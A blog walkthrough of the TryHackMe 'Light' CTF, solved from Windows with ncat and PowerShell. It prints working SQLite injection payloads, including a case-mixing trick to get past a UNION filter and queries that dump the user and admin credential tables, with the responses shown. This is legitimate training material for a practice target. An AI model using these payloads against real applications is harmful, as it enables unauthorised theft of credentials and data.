---
layout: post
title: "Light - TryHackMe Walkthrough"
date: 2025-04-27
categories: [writeup]
tags: [TryHackMe, CTF, PowerHack, Windows, PowerShell, Enumeration, ReverseShell]
image: /assets/img/Light/Light.png
---
💻 **PowerHack Series**  
This write-up is part of my *PowerHack* series — a personal initiative to solve [TryHackMe CTFs](https://tryhackme.com/hacktivities/challenges) using only **Windows-based tools**.  
From PowerShell to WSL, I'm proving that ethical hacking can be done effectively without leaving your Windows workstation.

![PowerHack Logga](/assets/img/powerhack.png)

# 💡 TryHackMe CTF: Light - PowerHack Style Walkthrough (Hacking from Windows)

Welcome to the **Light** [TryHackMe CTFs](https://tryhackme.com/room/light)! This walkthrough shows how to exploit a vulnerable SQLite-based application using **Windows tools**, such as `ncat.exe` and PowerShell — part of our **PowerHack** series, where we hack straight from a Windows box.

> ⚠️ No bruteforcing involved. All actions performed through logic and injection.

---

## 🚀 Challenge Overview

**Target:** `MACHIN-IP:1337`

* 🎯 Goal: Dump the admin username, password, and flag.
* 🧩 Backend: SQLite
* 🔐 Techniques: SQL Injection (Error-based, UNION-based, Enumeration)
* 🪟 Environment: Windows (PowerShell + `ncat.exe`)

---

## 1️⃣ Connecting from Windows with `ncat`

We begin by using `ncat.exe` to connect to the running service:

```powershell
ncat.exe MACHIN-IP 1337
```

> This opens a TCP connection to the service, giving us access to input and view responses directly.

The welcome message confirms:

```
Welcome to the Light database!
```

---

## 2️⃣ Checking the Given Username

Input:

```
Please enter your username: smokey
```

Response:

```
Password: vYQ5ngPpw8AdUmL
```

✅ This shows that submitting a valid username simply reveals its password. No authentication logic involved — only retrieval.

---

## 3️⃣ Testing for SQL Injection

We test the input for SQL Injection using a single quote:

```
Please enter your username: '
```

Response:

```
Error: unrecognized token: "''' LIMIT 30"
```

✅ The error confirms unsanitized SQL — it's vulnerable!

This is **typical of SQL Injection**: malformed input causes backend SQL parsing errors. We now try to exploit this.

---

## 4️⃣ Simple Injection to Bypass Query

Classic SQLi:

```
' OR '1'='1
```

Response:

```
Password: tF8tj2o94WE4LKC
```

✅ The password of the **first row** is returned, proving injection worked.

---

## 5️⃣ Exploring UNION-Based Injection

We try using `UNION SELECT` to extract data manually.

Initial test with comment `--`:

```
' UNION SELECT NULL --
```

Blocked.

Trying camelCase and different comment styles:

```
' UNIOn SELECt NULL '
```

Response:

```
Password: None
```

✅ Query succeeded, meaning **one column** is being selected.

---

## 6️⃣ Injecting and Extracting Arbitrary Data

Test injecting static data:

```
' UNIOn SELECt 1 '
```

Response:

```
Password: 1
```

Try fetching the DB version:

```
' UNIOn SELECt sqlite_version() '
```

Response:

```
Password: 3.31.1
```

✅ Confirmed: **SQLite** database.

---

## 7️⃣ Listing All Tables

Dumping table creation SQL:

```
' UNIOn SELECt group_concat(sql) FROM sqlite_master '
```

Response (shortened):

```
Password: CREATE TABLE usertable (...),CREATE TABLE admintable (...)
```

✅ Tables discovered:

* `usertable`
* `admintable`

---

## 8️⃣ Dumping All User Credentials

Use SQLite functions to concatenate and extract data:

```
' UNIOn SELECt group_concat(username || ':' || password) FROM usertable '
```

Response:

```
Password: alice:..., rob:..., michael:..., smokey:..., steve:...
```

✅ All user credentials retrieved successfully.

---

## 9️⃣ Extracting Admin & Flag (Obfuscated)

Same trick on `admintable`:

```
' UNIOn SELECt group_concat(username || ':' || password) FROM admintable '
```

Response:

```
Password: ########:########,flag:THM{##########_########_#####}
```

✅ Admin and flag successfully dumped — but we **won’t expose** the flag content here to comply with TryHackMe’s rules.

---

## ✅ Summary: Key Takeaways

* 🧠 **SQL Injection** can be exploited even without login forms — any unsanitized input may be vulnerable.
* 🔐 **SQLite** makes it easier to enumerate structure via `sqlite_master`.
* 💥 Using **PowerHack-style tooling** (e.g., `ncat.exe`, PowerShell) on **Windows** lets you hack without needing Kali or Linux distros.

---

## 🧰 Tools Used (Windows)

* `ncat.exe` — TCP communication with service
* PowerShell — for automation, encoding payloads, testing delays

---

## 🎯 Completion

We accomplished:

* ✅ SQL injection discovery
* ✅ Enumerated database
* ✅ Retrieved all users
* ✅ Extracted admin + flag (redacted)

🏁 **Light CTF Complete** – Windows-style.

---

## 🔁 Outro

This write-up is part of the **PowerHack** series — where we show how to hack CTFs and bug bounty targets using **only Windows + PowerShell tools**. No Linux box required.

Follow along to level up your recon and exploitation skills in a real-world Windows-friendly workflow. 💻⚡
